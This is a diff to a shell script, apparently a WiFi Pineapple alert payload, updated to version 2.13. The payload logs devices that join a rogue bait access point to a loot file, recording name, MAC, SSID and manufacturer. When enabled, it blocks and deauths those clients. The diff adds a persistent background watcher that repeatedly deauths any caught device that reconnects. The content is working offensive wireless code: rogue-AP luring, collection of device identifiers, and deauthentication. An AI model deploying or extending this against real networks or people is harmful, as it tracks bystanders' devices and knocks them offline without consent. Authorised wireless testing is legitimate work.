@@ -6,7 +6,7 @@
 ##              plus MAC and the bait SSID it connected to; appends a line to
 ##              loot. Shows a simple on-screen ALERT.
 ## Author: Skinny Research & Development
-## Version: 2.12
+## Version: 2.13
 ##
 ## Trigger: this is an ALERT payload. The Pager's pineapd launches it when a
 ##          client associates to the PineAP/OpenAP (pineapple_client_connected
@@ -29,10 +29,17 @@
 ## alert category is the toggle. Enable it in the Pager's Alerts UI (it appears
 ## next to CatchAndRelease) and, right after the alert, this payload blocks the
 ## client in the PineAP deny filter and deauths it via PINEAPPLE_DEAUTH_CLIENT.
-## The block is TEMPORARY (~15s): a detached helper re-allows the MAC afterwards
-## so the device can reconnect. Blocking first prevents the phone from instantly
-## rejoining the still-broadcast bait (which otherwise causes a connect/deauth
-## flap / spinner). Disable Auto-Kick and devices stay connected. Default: off.
+## The block is TEMPORARY (~15s, BLOCK_SECS): a detached helper re-allows the MAC
+## so the device can reconnect.
+##
+## The Pager only raises the "new client" alert once per MAC, so this payload
+## cannot kick re-connects itself. When Auto-Kick is on, this payload also starts
+## watch.sh, a background watcher that re-releases any MAC already present in
+## today's catch log whenever it re-appears on the OpenAP. That keeps kicking the
+## 2nd/3rd/4th connection. (The watcher logs KICKED with SSID "(reconnect)".)
+## Stop the watcher with: pkill -f CatchAndRelease/watch.sh
+##
+## Disable Auto-Kick and devices stay connected. Default: off.
 ##
 ## Loot:
 ##   /root/loot/catch-and-release/YYYYMMDD-catch-and-release.log
@@ -76,6 +83,9 @@ CATDIR="/root/payloads/alerts/pineapple_client_connected"
 # How long (seconds) a released client stays blocked in the deny filter before
 # it is allowed to reconnect.
 BLOCK_SECS=15
+
+# This payload's installed directory (holds release.sh / watch.sh helpers).
+RELDIR="/root/payloads/alerts/pineapple_client_connected/CatchAndRelease"
 
 # Strip pipe/tab/CR/LF so the single log line cannot be broken by odd input.
 san() { printf '%s' "$1" | tr -d '|\t\r\n'; }
@@ -128,33 +138,21 @@ port_open() {
     timeout 4 nc -w 2 "$ip" "$p" </dev/null >/dev/null 2>&1
 }
 
-# kick_client <mac>: release the client off the OpenAP. Blocks it in the PineAP
-# deny filter and deauths it, then a detached helper re-allows it after
-# BLOCK_SECS so it can reconnect (the bait is still being broadcast, so a bare
-# deauth would just flap). Returns non-zero if it could not be issued.
+# kick_client <mac>: release the client off the OpenAP via the shared helper.
 kick_client() {
-    local mac="$1" bssid ch prev
+    local mac="$1"
     [ -n "$mac" ] && [ "$mac" != "unknown" ] || return 1
-    command -v PINEAPPLE_DEAUTH_CLIENT >/dev/null 2>&1 || return 1
-    bssid="$(iw dev wlan0open info 2>/dev/null | awk '/addr/{print $2; exit}')"
-    [ -n "$bssid" ] || bssid="$(hostapd_cli -i wlan0open status 2>/dev/null | awk -F= '/^bssid\[0\]/{print $2}')"
-    ch="$(iw dev wlan0open info 2>/dev/null | sed -n 's/.*channel \([0-9][0-9]*\).*/\1/p')"
-    [ -n "$bssid" ] && [ -n "$ch" ] || return 1
+    [ -x "$RELDIR/release.sh" ] || return 1
+    "$RELDIR/release.sh" "$mac" "$BLOCK_SECS" >/dev/null 2>&1
+}
 
-    # Snapshot any existing deny entries so the temporary block does not wipe
-    # them when it clears itself (PINEAPPLE_DEVICE_FILTER_DELETE is broken).
-    prev="$(PINEAPPLE_DEVICE_FILTER_LIST deny 2>/dev/null \
-        | grep -oiE '([0-9a-f]{2}:){5}[0-9a-f]{2}' \
-        | grep -viE "^${mac}$" | tr '\n' ' ')"
-
-    command -v PINEAPPLE_DEVICE_FILTER_ADD >/dev/null 2>&1 && \
-        PINEAPPLE_DEVICE_FILTER_ADD deny "$mac" >/dev/null 2>&1
-    PINEAPPLE_DEAUTH_CLIENT "$bssid" "$mac" "$ch" >/dev/null 2>&1
-
-    # Un-block after BLOCK_SECS so the device can reconnect. Detached so it
-    # survives this payload exiting (new session via setsid).
-    setsid sh -c "sleep ${BLOCK_SECS:-15}; PINEAPPLE_DEVICE_FILTER_CLEAR deny >/dev/null 2>&1; for m in $prev; do PINEAPPLE_DEVICE_FILTER_ADD deny \$m >/dev/null 2>&1; done" \
-        >/dev/null 2>&1 </dev/null &
+# ensure_watcher: start the reconnect watcher (kicks reconnecting clients, which
+# the one-shot alert cannot). Runs in its own session so it survives this
+# payload exiting; it idles while Auto-Kick is disabled.
+ensure_watcher() {
+    [ -x "$RELDIR/watch.sh" ] || return 0
+    pgrep -f "CatchAndRelease/watch.sh" >/dev/null 2>&1 && return 0
+    setsid "$RELDIR/watch.sh" >/dev/null 2>&1 </dev/null &
 }
 
 # mdns_try <ip> <mac-lowercase>: one umdns browse + resolve pass. The embedded
@@ -304,8 +302,10 @@ printf '%s | %s | %s | %s | %s\n' \
 ALERT "New device\n\n Dev Name: $NAME\n $MACLABEL: $MAC\n SSID: $SSID\n man: $MAN"
 
 # Optional "release": if the Auto-Kick toggle is enabled, deauth the client now
-# that the catch has been logged and the alert has fired.
+# that the catch has been logged and the alert has fired, and start the watcher
+# so re-connects by an already-caught MAC are also released.
 if [ -d "$CATDIR/Auto-Kick" ]; then
+    ensure_watcher
     if kick_client "$MAC"; then
         printf '%s | %s | %s | %s | %s\n' \
             "$(date '+%Y-%m-%d %H:%M:%S')" "KICKED" "$MAC" "$SSID" "$IP" \
